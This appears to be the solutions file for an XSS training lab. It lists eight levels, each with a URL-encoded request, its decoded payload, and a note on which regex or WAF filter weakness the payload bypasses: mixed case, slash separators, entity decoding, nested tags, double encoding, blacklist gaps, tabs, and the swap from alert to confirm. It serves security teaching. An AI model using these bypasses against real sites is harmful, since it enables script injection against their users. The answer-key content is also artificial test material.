# regexbypass — solutions

Real-world WAF / regex bypass shapes: missing `/i`, slash separator, entity decode-after-filter, single-pass nesting, encode-decode mismatch, blacklist gaps.

### regexbypass-level1

`/regexbypass/level1/?query=%3CScript%3Ealert(1)%3C/Script%3E`

- payload: `<Script>alert(1)</Script>`
- context: `<script` blacklist without `/i` flag; mixed case bypass

### regexbypass-level2

`/regexbypass/level2/?query=%3Csvg/onload=alert(1)%3E`

- payload: `<svg/onload=alert(1)>`
- context: `\s+on\w+=` regex; slash separator avoids whitespace prefix

### regexbypass-level3

`/regexbypass/level3/?query=javas%26%2399;ript:alert(1)`

- payload: `javas&#99;ript:alert(1)`
- context: href attribute decodes HTML entity after literal `javascript:` strip

### regexbypass-level4

`/regexbypass/level4/?query=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/script%3E`

- payload: `<scr<script>ipt>alert(1)</script>`
- context: single-pass `<script>` removal collapses to `<script>`

### regexbypass-level5

`/regexbypass/level5/?query=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E`

- payload: `%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
- context: server entity-encodes `<>`, client `decodeURIComponent` then innerHTML

### regexbypass-level6

`/regexbypass/level6/?query=%3Cdetails%20open%20ontoggle=alert(1)%3E`

- payload: `<details open ontoggle=alert(1)>`
- context: blacklist misses `details` / `input` / `video`

### regexbypass-level7

`/regexbypass/level7/?query=%3Cimg%09src=x%09onerror=alert(1)%3E`

- payload: `<img\tsrc=x\tonerror=alert(1)>`
- context: only `\n` stripped; HTML accepts `\t` as attribute separator

### regexbypass-level8

`/regexbypass/level8/?query=%22-confirm(1)-%22`

- payload: `"-confirm(1)-"`
- context: JS string sink; `alert(` signature filter bypassed with `confirm`
